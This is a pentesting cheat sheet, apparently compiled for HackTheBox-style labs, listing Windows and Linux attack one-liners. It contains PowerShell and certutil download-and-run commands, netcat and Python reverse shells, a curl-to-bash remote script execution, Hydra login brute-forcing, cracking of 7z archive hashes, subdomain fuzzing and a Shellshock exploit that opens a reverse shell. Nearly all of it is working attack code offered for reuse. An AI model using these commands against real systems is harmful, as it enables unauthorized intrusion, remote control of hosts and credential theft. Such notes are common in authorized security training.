# Windows

## Smb shares enumerate

`smbclient -L 10.10.10.134 -U " "%" " `

## Hidden streams

* List files with streams: `dir \R`
* Read a stream from command line: `more < FileName:StreamName`

## List services

`wmic service where started=true get name, startname`

## Powershell reverse

`IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.3:8000/Invoke-PowerShellTcp.ps1')`

## Download nc and reverse shell

```
cmd.exe /C net use /D /Y * && cmd.exe /C certutil.exe -urlcache -split -f 'http://10.10.16.65/nc.exe' C:\Users\Public\nc.exe & C:\Users\Public\nc.exe 10.10.16.65 1234 -e powershell.exe
```

# Linux

## DNS zone transfer

`dig axfr @10.10.10.52 matis.htb`

## FTP download files 

`wget -r --no-passive ftp://10.10.10.106`

## Reverse shells

* socat file:\`tty\`,echo=0,raw udp-listen:4444
* `import subprocess;subprocess.Popen(["python", "-c", 'import os;import pty;import socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect((\"10.10.16.28\", 1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(\"HISTFILE\",\"/dev/null\");pty.spawn(\"/bin/sh\");s.close()'])`

## Get remote script and execute

`bash <(curl -s http://mywebsite.com/myscript.txt)`

## Find exclude specific words

`find / -type f -name "filename" 2>&1 | grep -v "Permission denied`

## Check capacity

`getcap -r / 2>/dev/null`

## ssh

### 使用 private key 登录

![AxtqoR.png](https://s2.ax1x.com/2019/04/16/AxtqoR.png)

修改 private key 权限，`chmod 4000`

## Tools

### Hydra

#### Brute force login form http

```
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password!" -Vv -f
 ```
 
 #### Brute force login form https
 
 ```
 hydra 10.10.10.43 -l whatever -P /opt/SecLists/Passwords/darkweb2017-top10000.txt https-post-form "/db/:password=^PASS^&remember=yes&login=log+in&proc_login=true:Incorrect password." -Vv -s 443
 ```

### John

#### 7z

```
/opt/john/run/7z2john.pl backup.7z > backup.hash
hashcat -m 11600 -a 0 -o backup.cracked backup.hash /usr/share/wordlists/rockyou.txt --force
```

### wfuzz

#### brute force subdomains

```
 wfuzz -w /opt/SecLists/Discovery/DNS/subdomains-top1mil-110000.txt -u http://10.10.10.120/ -H 'Host: FUZZ.chaos.htb' --hh 73 --hc 400
 ```

### Nmap 

#### ldap

`nmap -p 389 --script ldap-search 10.10.10.119`

## network

### Test icmp

`tcpdump -i tun0 icmp`

## Exploits

### Shellshock

```
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -i >& /dev/tcp/10.10.15.98/7777 0>&1 " http://10.10.10.56:80/cgi-bin/user.sh
```
